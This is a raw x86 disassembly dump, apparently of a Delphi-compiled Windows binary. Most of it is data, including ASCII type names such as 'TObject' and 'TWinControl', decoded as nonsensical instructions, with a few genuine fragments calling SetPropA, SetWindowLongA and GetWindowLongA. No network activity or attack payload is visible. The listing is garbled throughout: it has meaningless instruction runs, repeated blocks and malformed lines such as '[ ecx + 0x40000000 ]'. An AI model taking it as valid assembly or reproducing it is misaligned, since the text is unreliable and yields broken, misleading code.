rol [ ebx ] 0x0
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
jb r-xdata
pop ss
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0x7c ] si
adc [ eax ] eax
adc al 0xb1
inc ebx
add ah cl
mov edx 0x11080043
push esp
inc edi
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43bce0c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx - 0x3f93ffc0 ] al
inc ebx
add [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx - 0x3f93ffc0 ] al
inc ebx
add [ eax + ecx * 8 + 0x43 ] al
add [ eax ] al
adc [ eax ] al
cmp [ edx + 0xf080043 ] 0x54
push ebx
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
loopne r-xdata
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
pop eax
mov esp 0x10080043
push esp
dec ebp
outsd
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x620043be ] bl
rol [ ebx ] 0x5c
add [ eax ] eax
js r-xdata
insb
outsd
ja r-xdata
popad
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
inc ebx
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43bc58c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
test [ ecx ] dl
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc ecx
add [ eax ] al
add al 0x8b
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x27ffbfcc ] ch
pop ss
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
jo r-xdata
add [ ebx + ecx * 4 ] al
inc ebp
js r-xdata
outsb
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x4207ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 4 - 0x3f8fffbd ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x78c80040 ] al
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
push esp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x10540040 ] al
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
enter 0x43bb 0x0
or [ edi ] dl
inc ebx
add [ eax ] al
lea eax [ eax ]
clc
mov ebp 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ esi - 0x3f8fffbd ] bh
jbe r-xdata
add [ edx - 0x40 ] ah
inc ebx
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
add [ ebp + esi * 8 + 0x24b80043 ] bl
inc esp
add [ eax - 0x23ffbbe8 ] dh
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax ] al
clc
inc ebx
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ eax ] cl
inc edx
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add ah al
hlt
push eax
outsd
jae r-xdata
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x78c80040 ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push esp
mov ebp 0x12080043
push esp
inc ebx
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
push esp
push ebx
push 0x53746669
je r-xdata
sub_43c1c0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test dl al
inc ebx
add [ eax + eax ] ah
inc ecx
add [ eax + 0x1 ] bl
add bh bh
sub al 0xfd
inc ebx
add [ eax ] ah
and al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
inc ebx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
xor al 0x4
inc edx
add [ eax + ebp + 0x4680044 ] ah
inc edx
add [ eax ] ch
inc ebx
add [ esp + eax - 0xc2bffbe ] bl
inc ebx
add ah ch
add eax [ edx ]
add [ edx + eax * 2 ] 0x0
aam 0x4
inc edx
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ esp + eax ] dh
outsd
outsb
je r-xdata
add [ edx + esi * 8 ] dl
inc ebx
add ah cl
leave
inc esp
add [ eax - 0xbffbc0e ] cl
add [ eax - 0x2bffbdfc ] al
add al 0x42
js r-xdata
leave
inc esp
add al cl
sub [ eax + eax ] al
hlt
mov dl dh
inc ebx
add ah dh
add [ eax ] al
jl r-xdata
or dl al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 8 + 0x240043 ] al
sub_43c23e
inc ebx
add [ edx + esi * 8 - 0x35bbffbd ] bh
inc esp
add [ eax - 0x36 ] bl
inc esp
add ah dh
inc ebx
add [ eax + 0x500044ca ] al
inc ebx
add [ eax + 0x700044ca ] cl
inc ebx
add [ eax - 0x2fffbb36 ] dl
sub [ eax + eax + 0x64 ] al
hlt
sub_43c35a
inc ebx
add [ ebx ] al
or [ edx + eax * 2 + 0x65 ] edx
jbe r-xdata
outsd
jo r-xdata
insb
inc ebx
jne r-xdata
or [ edx + 0x65 ] ah
inc edx
outsd
je r-xdata
bound esp [ ebp + 0x52 ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x3d ] bl
inc ebx
add [ esi ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
dec esp
outsd
ja r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
add [ esi ] al
jb r-xdata
imul esp [ edi + 0x68 ] 0x65620874
push edx
retn
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
retn
mov al [ 0xffffffff8b0043c3 ]
rol [ eax ] 0xc4
inc ebx
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add [ eax - 0x74ffbc3d ] esp
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
add ah bh
add [ eax ] al
outsd
insb
jae r-xdata
retn
add [ eax ] al
cld
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
or cl [ eax ]
push esp
dec ecx
insd
dec esi
popad
insd
mov eax eax
inc eax
retn
movsb [ edi ] [ esi ]
retn
add [ eax ] cl
inc edx
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add al bl
outsd
insb
jae r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ eax ] bh
cmp al [ eax + eax + 0x34 ]
cmp eax 0x3b640044
inc esp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
lds eax [ ebx ]
dec eax
enter 0x43 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x360043c5 ] bh
enter 0x43 0x4
add al [ eax ]
add [ ebp + edi * 4 + 0x3480043 ] ch
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax + 0x24004034 ] ch
inc edi
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah bh
sub [ eax + eax - 0x4 ] eax
jbe r-xdata
add bh bh
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + eax * 8 + 0x43 ] bl
add [ ecx + eax ] bh
add [ ebx + eax * 8 ] ch
inc ebx
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add al al
inc ebp
inc esp
sub [ eax + eax + 0x10 ] al
jb r-xdata
add ah ch
inc esp
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0xd8004203
sub_43c417
inc ebx
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
lds eax [ ebx ]
outsd
insb
jae r-xdata
mov eax eax
inc esp
les eax [ ebx ]
outsb
je r-xdata
inc ebx
outsd
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add al al
inc ebp
inc esp
add ah ch
inc esp
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0xd8004203
sub [ eax + eax + 0x10 ] al
jb r-xdata
pop es
bound esp [ ebp + 0x52 ]
add [ ebx ] ecx
push esp
inc edx
jbe r-xdata
rol [ esp + eax * 8 + 0x43 ] 0x0
enter 0x43 0x4
add al [ eax ]
add [ ebp + edi * 4 + 0x3480043 ] ch
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax + 0x24004034 ] ch
inc edi
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah bh
sub [ eax + eax - 0x4 ] eax
jbe r-xdata
insb
push edi
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + eax * 8 + 0x43 ] bl
add [ ecx + eax ] bh
add [ ebx + eax * 8 ] ch
inc ebx
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ eax ] bh
cmp al [ eax + eax + 0x34 ]
cmp eax 0x3b640044
inc esp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
imul esp [ edi + 0x68 ] 0x65620874
inc edx
outsd
je r-xdata
push edx
retn
sub_43cc68
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xcc
inc ebx
add [ eax ] ch
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_43ce38
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or dh 0x43
add [ eax ] ch
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x4c ] bh
inc esp
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
add [ edx ] al
push 0xd8004203
sub [ eax + eax + 0x10 ] al
jb r-xdata
nop
aam 0xce
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
iretd
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ eax ] bh
cmp al [ eax + eax + 0x34 ]
cmp eax 0x3b640044
inc esp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add al al
inc ebp
inc esp
nop
fmul st7
inc ebx
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ eax + 0x440044bb ] cl
sub al [ eax ]
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add ah ch
inc esp
add ah bl
cmpsd [ esi ] [ edi ]
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc ecx
add [ eax + 0x24004034 ] ch
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ eax ] bh
cmp al [ eax + eax + 0x34 ]
cmp eax 0x3b640044
inc esp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
inc ecx
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0xd8004203
insb
aam 0xce
inc ebx
add [ eax + ecx * 8 + 0x43 ] al
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add al al
inc ebp
inc esp
inc edi
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah bh
sub [ eax + eax - 0x4 ] eax
jbe r-xdata
insb
je r-xdata
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ eax + 0x440044bb ] cl
sub al [ eax ]
inc esp
sub al [ eax ]
inc esp
sub al [ eax ]
sbb eax 0x73754354
sub [ eax + eax + 0x10 ] al
jb r-xdata
inc edx
add [ eax ] cl
inc edx
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add al bl
outsd
insb
jae r-xdata
sub eax [ edi ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
insd
dec ebp
jne r-xdata
add [ ebp - 0x2fabffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2f ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 + 0x43 ] cl
add [ edx + eax ] cl
add [ eax ] al
mov dh cl
inc ebx
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
mov eax [ eax + 0x18c ]
inc edi
add [ ebx - 0x6f76f7ab ] cl
add [ ecx ] 0x0
add [ ecx + rw-data ] ah
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
outsd
insb
mov eax eax
jo r-xdata
je r-xdata
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ 0x73754354 ] bl
inc ebx
add [ edi ] al
sbb eax 0x73754354
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
insd
dec ebp
jne r-xdata
inc ebp
or [ eax - 0x18 ] dl
jl r-xdata
je r-xdata
jae r-xdata
cld
[ ecx + 0x40000000 ]
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
push eax
call GetWindowLongA
test eax eax
jne r-xdata
inc ebx
outsd
outsb
je r-xdata
cwde
cld
inc [ ebp - 0x74f08a40 ]
inc ebp
or [ eax + 0x6a ] dl
hlt
outsd
insb
push esp
rol [ ebx ] 0x1
fmul st7
inc ebx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
aaa
0xe8a1fffc 0x472b
add [ eax + 0xf ] dl
mov bh 0x5
and ch [ ebx - 0x74afffb9 ]
inc ebp
or [ eax - 0x18 ] dl
outsd
insb
jae r-xdata
add [ edx + 0x1ea8010 ] cl
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
